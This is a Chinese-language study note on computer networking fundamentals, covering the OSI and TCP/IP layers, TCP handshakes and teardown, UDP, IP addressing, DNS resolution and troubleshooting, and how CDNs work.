## 第一章、计算机网络体系

### 1.1 计算机网络体系

![](./img/1-1-OSI七层模型.gif)

![](./img/1-1-OSI七层模型对比.jpg)

#### 1.1.1  OSI七层模型

- 应用层：允许访问OSI环境的手段（应用协议数据单元 APDU）
- 表示层：对数据进行翻译、加密和压缩（表示协议数据单元 PPDU）
- 会话层：建立、管理和终止会话（会话协议数据单元 SPDU）
- 传输层：提供端到端的可靠报文传递和错误恢复（段 Segment）
- 网络层：负责数据包从源到宿的传递和网际互连（包 PackeT）
- 数据链路层：将比特组装成帧和点到点的传递（帧 Frame）
- 物理层：通过媒介传输比特,确定机械及电气规范（比特 Bit）

#### 1.1.2 TCP/IP 概念层模型

- **应用层**（Application Layer）的任务是通过应用进程间的交互来完成特定网络应用。**应用层协议定义的是应用进程（进程：主机中正在运行的程序）间的通信和交互的规则**。对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统 DNS，支持万维网应用的 HTTP 协议，支持电子邮件的 SMTP 协议等等
- **传输层**（Transport Layer）的主要任务就是 **负责向两台主机进程之间的通信提供通用的数据传输服务**。应用进程利用该服务传送应用层报文。
- **网络层**的任务就是选择合适的网间路由和交换结点，确保计算机通信的数据及时传送。在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送。在 TCP/IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称数据报。
- **数据链路层**（Data Link Layer）通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。 在两个相邻节点之间传送数据时，数据链路层将网络层接下来的 IP 数据报组装成帧，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。
- 在**物理层**上所传送的数据单位是比特。 物理层（physical layer）的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。 在互联网使用的各种协议中最重要和最著名的就是 TCP/IP 两个协议。

### 1.2 传输层协议

传输层（Transport Layer）的主要任务就是负责向两台主机进程之间的通信提供通用的 **数据传输服务**。应用进程利用该服务传送应用层报文。

网络协议族中有两个具有代表性的传输层协议，分别是 TCP 和 UDP。

- 传输控制协议 TCP：提供面向连接的，可靠的数据传输服务
- 用户数据协议 UDP：提供无连接的，尽最大努力的数据传输服务（不保证数据传输的可靠性）

#### 1.2.1 TCP

传输控制协议（Transmission Control Protocol，简称 TCP）是一种 面向连接（连接导向）的、可靠的、 基于 IP 协议的传输层协议。

- 面向连接：每条 TCP 连接只能有两个端点（亦即点对点，不可广播、多播），每一条 TCP 连接只能是一对一
- 可靠的传输服务：通过 TCP 连接传送的数据，无差错、不丢失、不重复、并且按序到达，丢包时通过重传机制进而增加时延实现可靠性
- 全双工通信：TCP 允许通信双方的应用进程在任何时候都能发送数据。TCP 连接的两端都设有发送缓存和接收缓存，用来临时存放双方通信的数据
- 字节流：面向字节流，TCP 中的 流（Stream）指的是流入进程或从进程流出的字节序列
- 流量缓冲：解决速度不匹配问题

![](./img/1-2-1-TCP.jpeg)

数据包结构：TCP 首部标志比特有 6 个：URG、ACK、PSH、RST、SYN、FIN

| 控制位 | 名称             | 说明                             |
| ------ | ---------------- | -------------------------------- |
| URG    | Urgent Flag      | 紧急指针                         |
| ACK    | Acknowledge Flag | 确认序号有效                     |
| PSH    | Push Flag        | 尽可能快地将数据送往接收进程     |
| RST    | Reset Flag       | 可能需要重现创建建 TCP 连接      |
| SYN    | Synchronize      | 同步序号来发起一个连接           |
| FIN    | Finish           | 发送方完成发送任务，要求释放连接 |
| Seq    | Sequance number  | 序列号                           |

##### 1.2.1.1 三次握手

TCP 提供 **面向连接** 的通信传输。面向有连接是指在数据通信开始之前先做好两端之间的准备工作，也就是说无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。三次握手是指建立一个 TCP 连接时需要客户端和服务器端总共发送三个包以确认连接的建立。

**握手的目标：**

- 同步连接双方的 Sequence 序列号和确认号
  - 初始序列号 ISN
- 交换 TCP 窗口大小信息
  - 如 MSS、窗口比例因子、选择性确认、指定校验和算法

![](./img/1-1-2-1-三次握手.JPG)

1. **第一次握手**：**建立连接**。客户端发送连接请求报文段，将标志比特位 SYN 置为 1，随机产生一个序列号码 Sequence Number 值为 X（由操作系统动态随机选取一个 32 位长的序列号），并将该数据包发送给服务端，客户端进入 `SYN_SENT` 状态，等待服务端确认。
2. **第二次握手**：**服务端收到 SYN 报文段**。服务端收到数据包后需要对标志位 SYN 报文段进行确认，确认后设置确认号码 Acknowledgment Number 为 X+1（Sequence Number+1）；同时，自己还要发送 SYN 请求信息（以建立服务端对客户端的连接），将 SYN 设置为 1，设置 Sequence Number 值为 Y（由操作系统动态随机选取一个 32 位长的序列号），服务端将上述所有信息放到一个报文段（即 SYN+ACK 报文段）中，一并发送给客户端**以确认建立连接请求**，服务端进入 `SYN_RCVD` 状态。
3. **第三次握手**：**客户端收到服务端的 SYN+ACK 报文段**。确认后，然后将 Acknowledgment Number 设置为 Y+1，向服务端发送 ACK 报文段，这个报文段发送完毕后，客户端和服务器端进入 ESTABLISHED 状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。

握手过程中传送的包里不包含数据，只有三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP 连接一旦建立，在通信双方中的任何一方主动关闭连接之前，TCP 连接都将被一直保持下去。

##### 1.2.1.2 未连接队列

在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的 SYN 包（syn=j）开设一个条目，该条目表明服务器已收到 SYN 包，并向客户端发出确认，正在等待客户端的确认包。这些条目所标识的连接在服务器处于 SYN_RECV 状态，当服务器收到客户端的确认包时，删除该条目，服务器进入 ESTABLISHED 状态。

##### 1.2.1.3 为什么建立 TCP 连接需要三次握手？

主要是为了防止服务端开启无用的连接。

因为我们知道网络传输是有延时的，因为终端间隔了非常远的距离，数据包通过光纤以及各种中间代理服务器进行传输，但是在服务端和客户端的传输过程中，往往由于网络传输的不稳定原因丢失了数据包，客户端一直没有收到服务端返回的数据包，客户端可能设置了超时时间关闭了连接创建，那么就会再发起新的请求。如果没有第三次握手，服务端是不知道客户端到底有没有接收到服务端返回给他的数据的，客户端也没有一个确认说要关闭还是要创建这个请求，服务端的端口就一直开着，等着客户端发送实际的请求数据，那么这个时候开销就浪费了，服务端不知道这个连接已经创建失败了，可能客户端已经创建别的连接去了。

所以我们需要三次握手来确认这个过程，让服务端和客户端能及时察觉到网络原因导致的网络连接的关闭的问题，从而规避网络传输中因为延时导致导致的服务器开销问题。

##### 1.2.1.4 第三次握手可以发送数据吗？为何？

可以。因为能够发出第三次握手报文的主机，肯定接收到第二次（来自服务端）的握手报文。因为伪造 IP 的主机不会收到第二次报文。

##### 1.2.1.5 四次挥手

四次挥手即终止 TCP 连接，就是指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。在 Socket 编程中，这一过程由客户端或服务端任一方执行 close 来触发。

由于 TCP 连接是全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个 FIN 来终止这一方向的连接，收到一个 FIN 只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个 TCP 连接上仍然能够发送数据，直到这一方向也发送了 FIN。首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭。

![](./img/1-2-1-5-四次挥手.jpg)

1. **第一次挥手**：客户端设置 Sequence Number，发送一个 `FIN` 报文段，用于关闭客户端到服务器端的数据传送，客户端进入 `FIN_WAIT_1` 状态。意思是说「我客户端没有数据要发给你了」，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。
2. **第二次挥手**：服务器端收到 `FIN` 报文段，回复 `ACK` 报文段，Acknowledgment Number 为 Sequence Number 加 1，告诉客户端，你的请求我收到了，我同意你的关闭请求。这个时候客户端就进入 `FIN_WAIT_2` 状态。
3. **第三次挥手**：当服务器端确定数据已发送完成，则向客户端发送 `FIN` 报文段，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入 `LAST_ACK` 状态。
4. **第四次挥手**：客户端收到 `FIN` 报文段后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送 `ACK` 报文段回复服务端，然后进入 `TIME_WAIT` 状态，如果服务端端没有收到 `ACK` 则可以重传。服务器端收到 `ACK` 后，就知道可以断开连接了。客户端等待了 2MSL（通常是两分钟）后依然没有收到回复，则证明服务器端已正常关闭，那好，我客户端也可以关闭连接了。最终完成了四次握手。

##### 1.2.1.6 为什么断开 TCP 连接需要四次挥手？

由于 TCP 连接采取全双工的通信方式，因此每个方向都必须单独进行关闭，这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。

##### 1.2.1.7 为什么基于 TCP 的程序往往都有个应用层的心跳检测机制？

TCP 建立链接后，只是在两端的内核里面维持 TCP 信息，实际上并没有一个物理的连接通路，对端这个时候挂了，谁也不知道。

#### 1.2.2 UDP

用户数据报协议（User Datagram Protocol，UDP），又称使用者资料包协定，是一个简单的面向数据包的传输层协议，正式规范为 RFC 768。

在 TCP/IP 模型中，UDP 为网络层以上和应用层以下提供了一个简单的接口。UDP 只提供数据的不可靠传递，它一旦把应用程序发给网络层的数据发送出去，就不保留数据备份（所以 UDP 有时候也被认为是不可靠的数据报协议）。UDP 在 IP 数据报的头部仅仅加入了复用和数据校验（字段）。

- **无需建立连接**（减少延迟）
- 尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态
- UDP 的首部开销小，只有 8 个字节，比 TCP 的 20 个字节的首部要短
- 没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如直播，实时视频会议等）
- 支持一对一、一对多、多对一和多对多的交互通信

##### 1.2.2.1 基于 UDP 协议的有

- 域名系统（DNS）
- 简单网络管理协议（SNMP）
- 动态主机配置协议（DHCP）
- 路由信息协议（RIP）
- 自举协议（BOOTP）
- 简单文件传输协议（TFTP）

#### 1.2.3 数据通信形式

- 单工数据传输只支持数据在一个方向上传输
- 半双工数据传输允许数据在两个方向上传输，但是，在某一时刻，只允许数据在一个方向上传输，它实际上是一种切换方向的单工通信
- 全双工数据通信允许数据同时在两个方向上传输，因此，**全双工通信是两个单工通信方式的结合，它要求发送设备和接收设备都有独立的接收和发送能力**

#### 1.2.3 TCP 与 UDP对比

|          | TCP                   | UDP                      |
| -------- | --------------------- | ------------------------ |
| 连接性   | 面向连接              | 无连接                   |
| 双工性   | 全双工（1:1）         | `n:m`                    |
| 可靠性   | 可靠（重传机制）      | 不可靠（丢包后数据丢失） |
| 有序性   | 有序（通过 SYN 排序） | 无序                     |
| 有界性   | 无，有沾包情况        | 有消息边界，无沾包       |
| 拥塞控制 | 有                    | 无                       |
| 传输速度 | 慢                    | 快                       |
| 量级     | 低                    | 20-60 字节               |
| 头部大小 | 高                    | 8 字节                   |

### 1.3 网络层与数据链路层协议

网络层用来处理在网络上流动的数据包（数据包：网络上传输的最小数据单位）。网络层规定在众多选项中通过怎样的路径（传输线路）到达对方的计算机，把数据包传输给对方。

该层中最突出的协议是 Internet Protocol（IP），因此该层也称为 IP 层。IP 的核心是两个主要功能：**地址** 和 **路由**。

IP 协议是 TCP / IP 协议的核心，所有的 TCP、UDP、IMCP、IGMP 的数据都以 IP 数据格式传输。要注意的是，IP 不是可靠的协议，这是指 IP 协议没有提供一种数据未传达以后的处理机制，这被认为是上层协议：TCP 或 UDP 要做的事情。

网络层功能：

- IP 寻址
- 选路
- 封装打包
- 分片

数据链路层功能：

- 逻辑链路控制
- 媒体访问控制
- 封装链路层帧
- MAC 寻址
- 差错检测与处理
- 定义物理层标准

#### 1.3.1 IPv4 分类地址

在数据链路层中我们一般通过 MAC 地址来识别不同的节点，而在 IP 层我们也要有一个类似的地址标识，这就是 IP 地址。

32 位 IP 地址（IPv4 地址的点分十进制表示）分为网络位和地址位，这样做可以减少路由器中路由表记录的数目，有了网络地址，就可以限定拥有相同网络地址的终端都在同一个范围内，那么路由表只需要维护一条这个网络地址的方向，就可以找到相应的这些终端了。

| IP 地址类别 | 首字节      | 网络号 Bit 数 | 主机号 Bit 数 | 理论地址范围                    | 预期用途                         |
| ----------- | ----------- | ------------- | ------------- | ------------------------------- | -------------------------------- |
| A 类地址    | `0xxx xxxx` | 8             | 24            | `1.0.0.0` ~ `126.255.255.255`   | 特大网络的单播传输               |
| B 类地址    | `10xx xxxx` | 16            | 16            | `128.0.0.0` ~ `191.255.255.255` | 数千台中大型网络的单播传输       |
| C 类地址    | `110x xxxx` | 24            | 8             | `192.0.0.0` ~ `223.255.255.255` | 250 台主机以下小型网络的单播传输 |
| D 类地址    | `1110 xxxx` | n/a           | n/a           | `224.0.0.0` ~ `239.255.255.255` | IP 多播                          |
| E 类地址    | `1111 xxxx` | n/a           | n/a           | `240.0.0.0` ~ `255.255.255.255` | 预留实验用                       |

#### 1.3.2 CIDR 子网掩码

无类别域间路由（Classless Inter-Domain Routing，CIDR）是一个用于给用户分配 IP 地址以及在互联网上有效地路由 IP 数据包的对 IP 地址进行归类的方法。

表示方法：`A.B.C.D/N`（N 的范围 `[0, 32]`）

#### 1.3.3 链路层 MAC 地址

- 链路层地址 MAC（Media Access Control Address）
  - 实现本地网络设备间的直接传输
- 网络层地址 IP（Internet Protocol address）
  - 实现大型网络间的传输

#### 1.3.4 地址解析协议 ARP

动态地址解析协议（Address Resolution Protocol，ARP）是根据 IP 地址获取 MAC 地址的一种协议。

简单的来说 ARP 的作用就是把 IP 地址映射为物理地址，而与之相反的 RARP（逆向 ARP）就是将物理地址映射为 IP 地址。

#### 1.3.5 NAT 地址转换

网络地址转换（Network Address Translation，缩写：NAT；又称网络掩蔽、IP 掩蔽）在计算机网络中是一种在 IP 数据包通过路由器或防火墙时重写来源 IP 地址或目的 IP 地址的技术。这种技术被普遍使用在有多台主机但只通过一个公有 IP 地址访问互联网的私有网络中。它是一个方便且得到了广泛应用的技术。当然，NAT 也让主机之间的通信变得复杂，导致了通信效率的降低。

#### 1.3.6 IPv6

网际协议第 6 版（英语：Internet Protocol version 6，缩写：IPv6）是网际协议的最新版本，用作互联网的协议。用它来取代 IPv4 主要是为了解决 IPv4 地址枯竭问题，同时它也在其他方面对于 IPv4 有许多改进。

IPv6 目的：

- 更大的地址空间：128 位长度
- 更好的地址空间管理
- 消除 NAT 等寻址技术
- 更简易的 IP 配置管理
- 优秀的选路设计
- 更好的多播支持
- 安全性
- 移动性

IPv6 二进位制下为 128 位长度，以 16 位为一组，每组以冒号 `:` 隔开，可以分为 8 组，每组以 4 位十六进制方式表示。

### 1.4 DNS 域名解析系统

**DNS 域名解析系统（Domain Name System）** 是进行域名（domain name）和与之相对应的 IP 地址（IP address）转换的服务器。DNS 中保存了一张域名（domain name）和与之相对应的 IP 地址（IP address）的表，以解析消息的域名。

使用 IP 地址而非使用域名进行通信的原因：

- IP 地址是固定长度，IPv4 是 32 位，IPv6 是 128 位，而域名是变长的，不便于计算机处理
- IP 地址对于用户来说不方便记忆，但域名便于用户使用

简单来说就是 IP 面向主机，域名面向用户。

#### 1.4.1 域名的分层结构

由于因特网的用户数量较多，所以因特网在命名时采用的是层次树状结构的命名方法。任何一个连接在因特网上的主机或路由器，都有一个唯一的层次结构的名字，即域名（domain name）。这里，**域**（domain）是名字空间中一个可被管理的划分。从语法上讲，每一个域名都是有标号（label）序列组成，而各标号之间用点（`.`）隔开。域名可以划分为各个子域，子域还可以继续划分为子域的子域，这样就形成了顶级域、主域名、子域名等。

**域名系统必须要保持唯一性。**

特点：

1. 每个域名都是一个标号序列，用字母（大小写等价）、数字（0-9）和连接符（-）组成
2. 标号序列总长度不能超过 255 个字符，它由各标点之间用 `.` 分割成一个个的标号
3. 每个标号应该在 63 个字符之内，每个标号都可以堪称一个层次的域名
4. 级别最低的域名写在左边，级别最高的域名写在右边

域名服务是基于 UDP 实现的，服务器的端口号为 `53`。

以 `www.example.google.com` 为例：

- `.com`：是顶级域名
- `google.com`：是主域名（也可称托管一级域名），主要指企业名
- `example.google.com`：是子域名（也可称为托管二级域名）
- `www.example.google.com`：是子域名的子域（也可称为托管三级域名）

域名可以划分为各个子域，子域还可以继续划分为子域的子域，这样就形成了顶级域、二级域、三级域等。

| 顶级域名     | 标识                                                         |
| ------------ | ------------------------------------------------------------ |
| 国家顶级域名 | 中国 `cn`；美国 `us`；英国 `uk`                              |
| 通用顶级域名 | 公司企业 `com`；教育机构 `edu`；政府部门 `gov`；国际组织 `int`；军事部门 `mil`；网络 `net`；非盈利组织 `org` |
| 反向域名     | Arpa 用于 PTR 查询（IP 地址转换为域名）                      |

#### 1.4.2 查询类型

- 递归查询
  - 递归查询（Recursive）是一种 DNS 服务器的查询模式，在该模式下 DNS 服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果 DNS 服务器本地没有存储查询 DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。所以，一般情况下服务器跟内网 DNS 或直接 DNS 之间都采用递归查询。
- 迭代查询
  - DNS 服务器另外一种查询方式为迭代查询，DNS 服务器会向客户机提供其他能够解析查询请求的 DNS 服务器地址，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台 DNS 服务器地址，客户机再向这台 DNS 服务器提交请求，依次循环直到返回查询的结果。所以一般内网 DNS 和外网 DNS 之间的都采用迭代查询。

#### 1.4.3 分层结构

域名是分层结构，域名 DNS 服务器也是对应的层级结构。有了域名结构，还需要有域名 DNS 服务器去解析域名，且是需要由遍及全世界的域名 DNS 服务器去解析，域名 DNS 服务器实际上就是装有域名系统的主机。域名解析过程涉及 4 个 DNS 服务器，分别如下：

| 分类           | 作用                                                         |
| -------------- | ------------------------------------------------------------ |
| 根 DNS 服务器  | Root NameServer，本地域名服务器在本地查询不到解析结果时，则第一步会向它进行查询，并获取顶级域名服务器的 IP 地址。 |
| 顶级域名服务器 | TLD（Top-level） NameServer。负责管理在该顶级域名服务器下注册的二级域名，例如 `www.example.com`、`.com` 则是顶级域名服务器，在向它查询时，可以返回二级域名 `example.com` 所在的权威域名服务器地址 |
| 权威域名服务器 | Authoritative NameServer。在特定区域内具有唯一性，负责维护该区域内的域名与 IP 地址之间的对应关系，例如云解析 DNS。 |
| 本地域名服务器 | DNS Resolver 或 Local DNS。本地域名服务器是响应来自客户端的递归请求，并最终跟踪直到获取到解析结果的 DNS 服务器。例如用户本机自动分配的 DNS、运营商 ISP 分配的 DNS、谷歌/114 公共 DNS 等 |

#### 1.4.3 记录类型

在 DNS 系统中，最常见的资源记录方式是 Internet 类记录，该记录由包含 4 个字段的数据构成：`Name`、`Value`、`Type`、`TTL`。

其中 `Name` 和 `Value` 可以理解为一对键值对，但是其具体含义取决于 `Type` 的类型，`TTL` 记录了该条记录应当从缓存中删除的时间。

在资源记录的类型中中，最为常见且重要的类型 `Type` 主要有：

| 说明     |                                                              |
| -------- | ------------------------------------------------------------ |
| A        | 将域名指向一个 IPv4 地址，`A` 记录用于描述目标域名到 IP 地址的映射关系，将目标域名与 `A` 记录的 `Name` 字段进行匹配，将成功匹配的记录的 Value 字段的内容（IP 地址）输出到 DNS 回应报文中。 |
| CNAME    | 将域名指向另一个域名，`CNAME` 记录用于描述目的域名和别名的对应关系，如果说 `A` 记录可以将目标域名转换为对应主机的 IP 地址，那么 `CNAME` 记录则可以将一个域名（别名）转换为另一个域名，如果多条 `CNAME` 记录指向同一个域名，则可以将多个不同的域名的请求指向同一台服务器主机。并且，`CNAME` 记录通常还对应了一条 `A` 记录，用于提供被转换的域名的 IP 地址 |
| NS       | 将子域名指向另一个 DNS 服务器解析，`NS` 记录用于描述目标域名到负责解析该域名的 DNS 的映射关系，根据目标域名对 `NS` 记录的 `Name` 字段进行匹配，将成功匹配的记录的 `Value` 字段（负责解析目标域名的 DNS 的 IP 地址）输出到 DNS 回应报文中 |
| AAAA     | 将域名指向一个 IPv6 地址                                     |
| MX       | 将域名指向邮件服务器地址                                     |
| SRV      | 记录提供特定的服务的服务器                                   |
| TXT      | 文本长度限制 512，通常做 SDF 记录（反垃圾邮件）              |
| CAA      | CA 证书颁发机构授权校验                                      |
| 显性 URL | 将域名重定向至另一个地址                                     |
| 隐形 URL | 与显性 URL 类似，但是会隐藏真实的目标地址                    |

#### 1.4.4 解析过程

DNS 是一种使用 UDP 协议进行域名查询的协议，其最主要的目标就是将域名转换为 IP 地址。

DNS 查询的结果通常会在本地域名服务器中进行缓存，如果本地域名服务器中有缓存的情况下，则会跳过如下 DNS 查询步骤，很快返回解析结果。下面的示例则概述了本地域名服务器没有缓存的情况下，DNS 查询所需的 8 个步骤：

1. 用户在 Web 浏览器中输入 `www.taobao.com`， 则由本地域名服务器开始进行递归查询。
2. 本地域名服务器采用 **迭代查询** 的方法，向根域名服务器进行查询 。
3. 根域名服务器告诉本地域名服务器，下一步应该查询的顶级域名服务器 `.com` TLD 的 IP 地址
4. 本地域名服务器向顶级域名服务器 `.com` TLD 进行查询
5. `.com` TLD 服务器告诉本地域名服务器，下一步查询 `www.taobao.com` **权威域名服务器**的 IP 地址
6. 本地域名服务器向 `www.taobao.com` 权威域名服务器发送查询
7. `www.taobao.com` 权威域名服务器告诉本地域名服务器所查询的主机 IP 地址
8. 本地域名服务器最后把查询的 IP 地址响应给 Web 浏览器，一旦 DNS 查询的 8 个步骤返回了 `www.taobao.com` 的 IP 地址，浏览器就能够发出对网页的请求：
9. 浏览器向 IP 地址发出 HTTP 请求
10. 该 IP 处的 web 服务器返回要在浏览器中呈现的网页

![](./img/1-4-4-DNS.jpeg)

**详细解析：**

以查询 `www.taobao.com` 对应的 IP 地址为例，操作系统首先会在本地尝试解析，比如使用众所周知的 `hosts` 文件，同时如果有解析缓存的话，操作系统也会去查询。如果是在浏览器中进行查询，浏览器自己有时也会有解析缓存。

- 用户设备
  - 浏览器可能会缓存域名解析
  - 用户系统中可以有自己的域名映射表
- 公共域名服务器
  - 通常由 ISP 提供
  - 缓存上一级域名服务器的结果

在查询没有结果时，设备最终会开始向域名服务器发起查询请求。公共域名服务器一般就是用户的 ISP 提供的。这种公共域名服务器通常会缓存查询结果，因此如果缓存命中，查询就可以到此结束。当然缓存本身是有时效的，这个时效就被称为 TTL。对于超过时效的查询结果，域名服务器有义务重新发起查询请求。但查询本身是非常消耗流量的事情，因此也有一些公共服务器不严格遵守 TTL，超时缓存。

未命名缓存的查询，公共服务器会向顶级域名服务器进行查询。以上述例子来说，因为公共域名服务器不知道 `taobao.com` 的解析权归谁，因此它会向顶级域名服务器 ——`com` 域名服务器发起请求，寻找 `taobao.com` 对应的域名服务器。顶级域名服务器一般是由域名经营机构来维护的，有些甚至归属国家机关管理，例如国别域名。理论上来说，在顶级域名服务器之上还有一个根域名服务器，不过在平时很难意识到它的存在。

- 公共域名服务器
  - DNS 级联的特性决定了中途可以有更多域名服务器
- 顶级域名服务器
  - 由顶级域名经营机构维护
  - 可细分为与国家、通用

在查找到 `taobao.com` 的域名服务器之后，就可以向域名服务器查询 `www.taobao.com` 的 IP 了。这个过程是由上到下指定下来的，所以这种域名服务器可以被称为权威域名服务器。对于开发者来说，我们自己平时在域名服务器那里购买到域名之后，录入自己域名对应的 IP，其实就是在向权威域名服务器录入信息。一些大型企业会自己维护权威域名服务器，这样既可以抵御一些针对性的攻击，同时也可以更好地优化解析的速度。

- 公共域名服务器
- 权威域名服务器
  - 通常由专业的域名服务机构提供
  - 购买域名时一般会提供

#### 1.4.5 排查与优化

#####  1.4.5.1 常见问题

- DNS 服务器本身有问题，响应慢并且不稳定
- 或者是，客户端到 DNS 服务器的网络延迟比较大
- 再或者，DNS 请求或者响应包，在某些情况下被链路中的网络设备弄丢了

##### 1.4.5.2 故障排查顺序

1. 检查本地 `hosts`：`cat /etc/hosts`  windows上在`C:\Windows\System32\drivers\etc\hosts`
2. 检查 `resolv.conf` 文件：`cat /etc/resolv.conf`。在 `Redhat7 / Centos7` 上修改 `resolv.conf` 里的 DNS 地址后，重启启网络服务发现 DNS 地址消失了，那么检查下网卡配置文件。
3. 检查网卡配置文件：`cat /etc/sysconfig/network-scripts/ifcfg-<网卡名称>`，看下里头有没 DNS 配置信息，没有的话补上去。

##### 1.4.5.3 常见优化技术

1. HttpDNS：客户端基于 HTTP 协议，向 CDN 服务商指定的 DNS 服务器发送域名解析请求，从而避免 LocalDNS 造成的域名劫持和跨网访问
2. Http 302 跳转：CDN 厂商维护 CDN 域名 IP 库，根据用户访问终端的 IP 和 CDN 边缘节点的状态，选择最合适的 CDN 节点，发出 HTTP 的 302 返回码，将用户的请求跳转到合适的 CDN 边缘节点。

##### 1.4.5.4 常见优化方法

- 缓存：缓存是最有效的方法，但要注意，一旦缓存过期，还是要去 DNS 服务器重新获取新记录。不过，这对大部分应用程序来说都是可接受的。
- 预解析：这是浏览器等 Web 应用中最常用的方法，也就是说，不等用户点击页面上的超链接，浏览器就会在后台自动解析域名，并把结果缓存起来。
- HTTPDNS：使用 HTTPDNS 取代常规的 DNS 解析。这是很多移动应用会选择的方法，特别是如今域名劫持普遍存在，使用 HTTP 协议绕过链路中的 DNS 服务器，就可以避免域名劫持的问题。
- 全局负载均衡：基于 DNS 的全局负载均衡（GSLB）。这不仅为服务提供了负载均衡和高可用的功能，还可以根据用户的位置，返回距离最近的 IP 地址。
- 对于移动客户端，在 APP 启动时对需要解析的域名做预先解析，然后把解析的结果缓存到本地的一个 LRU 缓存里面。这样当我们要使用这个域名的时候，只需要从缓存中直接拿到所需要的 IP 地址就好了，如果缓存中不存在才会走整个 DNS 查询的过程。同时为了避免 DNS 解析结果的变更造成缓存内数据失效，我们可以启动一个定时器定期地更新缓存中的数据。

##### 1.4.5.5 DNS 污染解决方案

一般是考虑尽可能自主控制 DNS 解析，比如使用专用 DNS 服务器，HTTPDNS，甚至是直接使用 IP 地址跳过解析

#### 1.4.6 常用 DNS

- 114 DNS：`114.114.114.114` 或 `114.114.115.115`
- 阿里 DNS：`223.5.5.5` 或 `223.6.6.6`
- 百度 DNS：`180.76.76.76`
- DNS 派：
  - 电信 `101.226.4.6`
  - 联通 `123.125.81.6`
  - 移动 `101.226.4.6`
  - 铁通 `101.226.4.6`
- OneDNS
  - 南方 `112.124.47.27`
  - 北方 `114.215.126.16`
  - 共用 `42.236.82.22`
- Google DNS：`8.8.8.8` 或 `8.8.4.4`
- OpenDNS：`208.67.222.222` 或 `208.67.220.220`
- 360 DNS：`101.226.4.6` 或 `123.125.81.6`

### 1.5 CDN 内容分发网络

**內容分发网络（Content Delivery Network 或 Content Distribution Network，简称 CDN）** 通过将源站内容分发至 **最接近用户** 的节点，从而 **降低核心系统负载（系统、网络）**，使用户可就近取得所需内容，**提高用户访问的响应速度**。这种技术方案解决了因分布、带宽、服务器性能带来的访问延迟问题，适用于图片小文件、大文件下载、音视频点播、全站加速和安全加速等场景。

#### 1.5.1 工作原理

通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN 系统能够实时地根据 **网络流量** 和 **各节点的连接**、**负载状况** 以及 **到用户的距离** 和 **响应时间** 等综合信息将用户的请求重新导向离用户最近的服务节点上。

CDN = 更智能的镜像 + 缓存 + 流量导流;

CDN 是一个经策略性部署的整体系统，包括**分布式存储**、**负载均衡**、**网络请求的重定向** 和 **内容管理** 4 个要件，而内容管理和全局的网络流量管理（Traffic Management）是 CDN 的核心所在。

#### 1.5.2 工作流程

用户终端访问 CDN 的过程分为两个步骤，一是用户通过 DNS 找到最近的 CDN 边缘节点 IP，二是数据在网络中送达用户终端。

最简单的 CDN 网络由一个 DNS 服务器和几台缓存服务器组成，假设您的加速域名为 `www.taobao.com`，接入 CDN 网络，开始使用加速服务后，当终端用户（广州）发起 HTTP 请求时，处理流程如下：

![](./img/1-5-2-cdn工作流程.jpg)

1. 当终端用户（广州）向 `www.taobao.com` 下的某资源发起请求时，首先向 LDNS（本地 DNS）发起域名解析请求。
2. LDNS 检查缓存中是否有 `www.taobao.com` 的 IP 地址记录。如果有，则直接返回给终端用户；如果没有，则向授权 DNS 查询。
3. 当授权 DNS 解析 `www.taobao.com` 时，返回域名 CNAME `www.taobao.alicdn.com` 对应 IP 地址。
4. 域名解析请求发送至 DNS 调度系统，并为请求分配最佳节点 IP 地址。
5. LDNS 获取 DNS 返回的解析 IP 地址。
6. 用户获取解析 IP 地址。
7. 用户向获取的 IP 地址发起对该资源的访问请求。
   - 如果该 IP 地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如，图中步骤 7 和 8，请求结束。
   - 如果该 IP 地址对应的节点未缓存该资源，则节点向它的上级缓存服务器请求内容，直至追溯到网站的源站发起对该资源的请求。获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点，例如，途中的杭州节点，并返回给用户，请求结束。

*Local DNS 通常是你的运营商提供的 DNS，一般域名解析的第一站会到这里 回源 HOST 是指 CDN 节点在回源过程中，在源站访问的站点域名。*

在步骤四中，DNS 调度系统可以实现负载均衡功能，负载均衡分为全局负载均衡和区域负载均衡，其内部逻辑大致如下：

1. CDN 全局负载均衡设备会根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的**区域负载均衡设备**，告诉用户向这台设备发起请求。
2. 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：
   - 根据用户 IP 地址，判断哪一台服务器距用户最近；
   - 用户所处的运营商；
   - 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；
